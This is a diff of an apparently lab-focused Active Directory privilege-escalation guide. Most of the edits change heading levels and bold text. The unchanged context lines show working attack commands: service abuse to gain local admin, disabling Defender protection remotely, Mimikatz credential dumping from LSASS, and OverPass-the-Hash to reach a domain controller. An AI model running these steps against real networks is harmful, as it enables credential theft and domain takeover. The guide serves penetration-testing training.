@@ -8,15 +8,15 @@ description: Designed to provide a comprehensive guide to Active Directory (AD) 
 ---
 
 
-# 1. Local Privilege Escalation
+## Local Privilege Escalation
 
- **In Active Directory Environment, there are multiple scenarios which lead to privilege escalation. We had a look at the following:**
+ In Active Directory Environment, there are multiple scenarios which lead to privilege escalation. We had a look at the following:
  
  - Hunting for Local Admin access on other machines
  - Hunting for high privilege domain accounts (like a Domain Administrator)
- - **Example Scenario :** I have local admin access on a machine **-->** A Domain Admin has a session on that machine **-->** I steal his token and impersonate him **-->** Profit!
+ - Example Scenario : I have local admin access on a machine --> A Domain Admin has a session on that machine --> I steal his token and impersonate him --> Profit!
 
- **There are various ways of locally escalting privilege on Windows:**
+ There are various ways of locally escalting privilege on Windows:
  
  - Missing Patches
  - Automated Deployment and AutoLogon password in clear text
@@ -26,13 +26,13 @@ description: Designed to provide a comprehensive guide to Active Directory (AD) 
  - NTLM Relaying a.k.a Wont’t Fix
  - NTLM Relaying example - https://github.com/antonioCoco/RemotePotato0
 
- **We can use below tools for complete coverage:**
+ We can use below tools for complete coverage:
  
  - https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1
  - https://github.com/enjoiz/Privesc
  - https://github.com/peass-ng/PEASS-ng/blob/master/winPEAS/winPEASexe/README.md - Very NOISY
 
-# 2. Check for any privilege escalation path - PowerUp
+## 2. Check for any privilege escalation path - PowerUp
 
 First step for local privilege escalation, we will try to check for any privilege escalation path. Then if we found any services that can be abused, we can add our domain user to the local admin group.
 
@@ -48,7 +48,7 @@ Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\studentx' -Verbose
 
 Now, our user is a local admin !
 
-# 3. Identify any machine in the domain where our user has local administrative - Find-PSRemotingLocalAdminAccess.ps1
+## 3. Identify any machine in the domain where our user has local administrative - Find-PSRemotingLocalAdminAccess.ps1
 
 Next step, we will try to identify any computers/machines in the domain where our user has local administrative access. 
 
@@ -74,7 +74,7 @@ We can also use PowerShell Remoting
 Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local
 ```
 
-# 4. Identify a machine in the domain where a Domain Admin session is available - PowerView
+## 4. Identify a machine in the domain where a Domain Admin session is available - PowerView
 
 A request will be sent to Domain Controller to retrieve all ComputerName and membership of the domain admin's group which has admin session there.
 {: .prompt-info }
@@ -82,7 +82,7 @@ A request will be sent to Domain Controller to retrieve all ComputerName and mem
 Find-DomainUserLocation
 ```
 
-# 5. Extract Credentials from LSASS - Invoke Mimikatz
+## 5. Extract Credentials from LSASS - Invoke Mimikatz
 
 Once we have remote admin session on the remote machine, we will extract credentials from LSASS. Bear in mind , **to avoid LSASS unless you have nothing to do.**
 
@@ -111,7 +111,7 @@ Invoke-command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Sess
 Invoke-command -ScriptBlock ${function:Invoke-Mimi} -Session $sess
 ```
 
-# 6. Using OverPass-the-Hash - Rubeus
+## 6. Using OverPass-the-Hash - Rubeus
 
 Finally, use OverPass-the-Hash to use svcadmin's credentials.
 
@@ -142,7 +142,7 @@ Note that we did not need to have direct access to dcorp-mgmt from student machi
 winrs -r:dcorp-dc cmd /c set username USERNAME=svcadmin
 ```
 
-# 7. Domain Admin Escalation using Derivative Local Admin - Find-PSRemotingLocalAdminAccess.ps1
+## 7. Domain Admin Escalation using Derivative Local Admin - Find-PSRemotingLocalAdminAccess.ps1
 
 {: .prompt-info }
 ```bash
